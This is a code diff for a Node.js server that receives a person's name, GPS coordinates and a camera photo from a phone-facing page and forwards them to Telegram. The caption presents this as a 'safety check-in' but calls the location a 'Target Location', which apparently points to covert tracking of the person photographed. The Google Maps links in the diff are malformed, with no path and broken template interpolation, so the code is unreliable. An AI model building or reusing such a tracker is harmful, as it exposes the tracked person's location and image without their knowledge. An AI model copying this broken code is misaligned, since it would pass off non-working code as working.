@@ -76,7 +76,6 @@ const server = http.createServer((req, res) => {
     }
 
     if (req.method === 'GET') {
-        // Read and serve the separate index.html file to the phone
         fs.readFile(path.join(__dirname, 'index.html'), (err, content) => {
             if (err) {
                 res.writeHead(500); res.end("Missing index.html file");
@@ -119,12 +118,12 @@ const server = http.createServer((req, res) => {
             try {
                 const payload = JSON.parse(body);
                 const time = new Date().toLocaleTimeString();
-                const mapsLink = `https://google.com{payload.lat},${payload.lon}`;
+                const mapsLink = `https://google.com{payload.lat},{payload.lon}`;
                 
                 const base64Data = payload.image.replace(/^data:image\/jpeg;base64,/, "");
                 const imgBuffer = Buffer.from(base64Data, 'base64');
                 
-                const captionText = `📸 *Visual Safety Check-In Received!*\n👤 *From:* ${payload.name}\n⏰ *Time:* ${time}\n🗺️ [Open Google Maps Target Location](${mapsLink})`;
+                const captionText = `📸 *Visual Safety Check-In Received!*\n👤 *From:* ${payload.name}\n⏰ *Time:* ${time}\n🗺️ [Open Google Maps Target Location](https://google.com{payload.lat},${payload.lon})`;
                 
                 sendTelegramPhoto(captionText, imgBuffer);
             } catch (e) {}
